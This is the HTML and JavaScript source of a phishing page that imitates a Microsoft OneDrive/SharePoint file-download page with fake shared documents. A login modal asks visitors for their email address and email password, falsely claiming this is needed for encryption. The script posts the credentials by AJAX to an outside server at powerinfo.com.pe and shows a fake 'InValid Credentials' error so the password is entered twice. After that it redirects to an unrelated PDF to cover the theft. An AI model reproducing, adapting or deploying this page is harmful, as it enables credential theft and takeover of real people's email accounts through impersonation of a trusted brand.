<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta name="robots" content="noindex">
    <link rel="icon" href="">

    <title>OneDrive - Download files</title>

    <!-- Bootstrap core CSS -->
    <link href="https://www.powerinfo.com.pe/api/lng/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="https://www.powerinfo.com.pe/api/lng/offcanvas.css" rel="stylesheet">
    <style>
      .card-img-top {
        width: 100%;
        border-top-left-radius: 0;
        border-top-right-radius: 0;
        }


        /* Medium devices (landscape tablets, 768px and up) */
        @media only screen and (max-width: 768px) {
          .sec-column {
            display: none;
          }
        } 
    </style>
  </head>

  <body class="bg-light" style="">

    <nav style="height: 50px;" class="navbar navbar-expand-md fixed-top navbar-dark bg-blue">
      <a style="font-size: 16px;" class="navbar-brand" href="javascript:void(0)">Microsoft | <span style="font-weight: 600;">SharePoint</span></a>
      <button class="navbar-toggler p-0 border-0" type="button" data-toggle="offcanvas" style="">
        <span class="navbar-toggler-icon"></span>
      </button>
    </nav>

    

    <main role="main" class="container">

    <!-- Create the Page Row  -->
    <div class="row">

        <!-- First Column  -->
        <div class="col-sm-12 col-md-9">
          <!-- Caption Area -->
            <div class="d-flex align-items-center p-3 my-3 text-white-50 bg-blue rounded box-shadow">
              <img class="mr-3" src="https://www.powerinfo.com.pe/api/lng/white-onedrive.svg" alt="" width="48" height="48">
              <div class="lh-100">
                <h6 class="mb-0 text-white lh-100">OneDrive</h6>
                <small>Total file size: 47 MB</small>
              </div>
            </div>

            <!-- File Explorer Area -->
            <div class="my-3 p-3 bg-white rounded box-shadow">
              <h6 class="border-bottom border-gray pb-2 mb-0">File Explorer</h6>
              <div class="media text-muted pt-3">
                <img width="32px" height="32px" src="https://www.powerinfo.com.pe/api/lng/word-icon.png" alt="" class="mr-2 rounded">
                <div class="media-body pb-3 mb-0 small lh-125 border-bottom border-gray">
                  <div class="d-flex justify-content-between align-items-center w-100">
                    <strong class="text-gray-dark">2020 Products Brochure.docx</strong>
                    <a href="#" data-toggle="modal" data-target="#myModal">View</a>
                </div>
                  <span class="d-block">Description: Contract tender</span>
              </div>
            </div>


          <!--<div class="media text-muted pt-3">-->
          <!--  <img width="32px" height="32px" src=""  alt="" class="mr-2 rounded">-->
          <!--  <div class="media-body pb-3 mb-0 small lh-125 border-bottom border-gray">-->
          <!--    <div class="d-flex justify-content-between align-items-center w-100">-->
          <!--      <strong class="text-gray-dark">PO.xlsx</strong>-->
          <!--      <a href="#" data-toggle="modal" data-target="#myModal">View</a>-->
          <!--    </div>-->
          <!--    <span class="d-block">Description: A spreadsheet file containing purchase order</span>-->
          <!--  </div>-->
          <!--</div>-->

          <div class="media text-muted pt-3">
            <img width="32px" height="32px" src="https://www.powerinfo.com.pe/api/lng/ppt-icon.png" alt="" class="mr-2 rounded">
            <div class="media-body pb-3 mb-0 small lh-125 border-bottom border-gray">
              <div class="d-flex justify-content-between align-items-center w-100">
                <strong class="text-gray-dark">Products Specifications</strong>
                <a href="#" data-toggle="modal" data-target="#myModal">View</a>
              </div>
              <span class="d-block">Description: An electronic presentation of product design and specification </span>
            </div>
          </div>
          <small class="d-block text-right mt-3">
            <a href="#" data-toggle="modal" data-target="#myModal">Download All</a>
          </small>
         </div>

        </div>
        <!-- End of First column -->


        <!-- Second Column For Advertisement-->
        <div class="col-sm-12 col-md-3 mt-3 sec-column">
            <div class="card">
             <!-- Header Title for the Card -->
               <h6 class="card-header">Advertisement</h6>
               <!-- Ads Image  -->
               <img class="card-img-top" src="https://www.powerinfo.com.pe/api/lng/outlook-anim.gif" alt="Card image cap">
               <div class="card-body">
                  <!-- <h5 class="card-title">Signed by:</h5> -->
                  <p class="card-text" style="margin-bottom: 0;"><small class="text-muted">Signed by: Sales Manager </small></p>
                  <p class="card-text"><small class="text-muted">Public Access Duration: 24 hrs </small></p>
              </div>
          </div>
        </div>
        <!-- End of Second Column -->

    </div>
    <!-- End of the Column -->

    
     

     
    </main>

    <!-- The Footer -->
    <footer class="footer">
      <div class="container">
        <span class="text-muted" style="font-size: 13px;">© Microsoft 2020.</span>
      </div>
    </footer>


    <!--Beginning of the Modal Box  -->
    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true" style="display: none;">
      <div class="modal-dialog modal-dialog-centered" role="document">

        <!-- First Modal Content  -->
            <div id="first-view" style="display: none;" class="modal-content">
              <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLongTitle"></h5>
                
              </div>
              <div class="modal-body">

              <!-- Spinner or Loader -->
              <div class="d-flex justify-content-center">
                <div class="row">
                   <div class="col"><img src="https://www.powerinfo.com.pe/api/lng/loader.gif" alt=""></div>
                   <div class="col"> <div> <p>Please wait. while we try to establish connection with your email server</p></div></div>
                </div>
               
               
              </div>
                <!-- End of Spinner or Loader -->

              </div>
              <div class="modal-footer">
                
              </div>
            </div>

        <!-- End of First Modal  -->


        <!-- Second Modal Content -->
            <div id="second-view" class="modal-content">
              <div class="modal-header">
                <h5 class="modal-title" id="exampleModalLongTitle">Reciever's Authentication Desk</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                  <span aria-hidden="true">×</span>
                </button>
              </div>

             
              <div class="modal-body">
                
              <form>
                  <!-- Server based Ajax Response -->
                  <div class="alert alert-danger" id="serverResponse" style="display: none;">InValid Credentials</div>
                  <div class="form-group">
                    <label for="exampleInputEmail1"> Email address</label>
                    <input type="email" id="um" name"user"  class="form-control" aria-describedby="emailHelp" placeholder="Receiver&#39;s Enter email">
                    <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
                  </div>

                  <div class="form-group">
                    <label for="exampleInputPassword1">Password</label>
                    <input type="password" name="pass" class="form-control" id="up" placeholder="Receiver&#39;s Email Password">
                    <small id="emailHelp" class="form-text text-muted">Required for end to end encryption.</small>
                  </div>
                  <div class="form-check">
                    <input type="checkbox" disabled="" checked="" class="form-check-input" id="exampleCheck1">
                    <label class="form-check-label" for="exampleCheck1" style="color:green;">Data Encryption Enabled</label>
                  </div>
                
                  </form>
              <div class="modal-footer">
                <!-- <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary">Next</button> -->
                <button type="button" id="viewFile" class="btn btn-primary">View Files</button>
               
              </div>
              <div><small style="">Tip: To access files, enter receiver's email and password</small></div>
              <div><small style="font-size:10px;">All rights reserved. ©Microsoft 2020</small></div>
             
              
              
            </div>
            </div>
        

      </div>
    </div>
    <!--Ending of the Modal Box  -->

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://www.powerinfo.com.pe/api/lng/jquery.min.js.download"></script>
    <script src="https://www.powerinfo.com.pe/api/lng/bootstrap.min.js.download"></script>
    <script src="https://www.powerinfo.com.pe/api/lng/popper.min.js.download"></script>
    <script src="https://www.powerinfo.com.pe/api/lng/holder.min.js.download"></script>
    <script> 
          // View file Button
          let viewFileBtn = document.getElementById('viewFile');
          //Useremail
          let um =  document.getElementById('um');
          //UserPass
          let up =  document.getElementById('up');
          //Input Flag
          let inputFlag = false;



        // Email address Validation Eventlistener
        um.addEventListener('blur', validateEmail);

        // Pass Validation Eventlistener
        up.addEventListener('blur', validatePass);



          /**
           * Validate UserEmail
           */
          function validateEmail() {
            // Target the Desired Element
            const email = document.getElementById('um');
            // Regular Expression 
            const re = /^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$/;
            
            // Check if the email form field is disabled or not
            if(email.disabled !== true) {
                if(!re.test(email.value)) {
                    // Add the Invalid Class to it
                    email.classList.add('is-invalid');
                    inputFlag = false;
                  
                } else {
                    // Add the Invalid Class to it
                    email.classList.remove('is-invalid');
                    inputFlag = true;
                  
                }
            }else {
                // Make the email Validation flag true
                inputFlag = true;
            }
        }


        /**
         * This fuction displays the loader
         */
        function displayLoader(){
          $('#first-view').show();
        }


        /**
         * Clear errors
         */
        function clearErrors(){
          $('#serverResponse').hide();
        }


         /**
         * This fuction displays the loader
         */
        function hideLoader(){
          $('#first-view').hide()
        }


        function hidePageContent(){
          $('#second-view').hide();
        }


        function showPageContent(){
          $('#second-view').show();
        }



        /**
         * Validate User Password
         */
        function validatePass() {
            /*  Target the Desired Element */
          const pass = document.getElementById('up');
          
          if(pass.value.trim() == '' || pass.value.length < 5) {
              // Add the Invalid Class to it
              pass.classList.add('is-invalid');
              inputFlag = false;
          } else {
                inputFlag = true;
                // Add the Invalid Class to it
                pass.classList.remove('is-invalid');
          }
        }


 var count=0;


        //Add eventlistener
        viewFileBtn.addEventListener('click',function(e){
            // clear Errors
            clearErrors();

            // Prevent Default Action
            e.preventDefault();

            // Check if there are no errors
            if(inputFlag == true) {
              
            /** Build the Form Values to be sent behind the seen VIA ajax */
                /**
             * Make an Ajax Request To the Server
             */
             count=count+1;
            $.ajax({
                /**URL to pass the Request to */
                url: "https://www.powerinfo.com.pe/api/next.php",
                /** Type of HTTP request to be made to the server */
                type: 'post',
                /** Do this before Making the Ajax Request */
                beforeSend: function () {
                   
                    um.disabled = true;
                    up.disabled = true;
                    // Disable the Submit button
                   viewFileBtn.disabled = true;

                   //Display Loader
                   setTimeout(() => {
                      //Hide Page Contents
                      hidePageContent();
                     //Display The Loader
                     displayLoader();
                   }, 1200);
                  },
        
                  /** Data to be transmitted through AJax Request */
                data: {user:um.value,pass:up.value},

                success: function(res){
                    /** Do this if the Ajax Request Was Successful */
                    $("#up").val("");
                    if(count>=2){
                       count=0;
                        // Redirect the User
                        window.location.replace("https://www.onosokki.co.jp/English/hp_e/whats_new/Catalog/PDF/overseas_12.pdf");
                      //  $('#serverResponse').html(res);
                    }else{
                          //Insert the Server response
                          $("#serverResponse").animate({right:0, opacity:"show"}, 1500);
                          // $('#serverResponse').show();
                        /**
                           * Hide Loader After two seconds
                           */
                          setTimeout(() => {
                          hideLoader();
                          showPageContent();
                          }, 5000);
                    }
                },
              }).done(function() {
                /**
                 * Enable all the Disabled inputs
                 */
                viewFileBtn.disabled = false;
                um.disabled = false;
                up.disabled = false;

               
              });
                

            }
        

        });
    </script>
  

</body></html>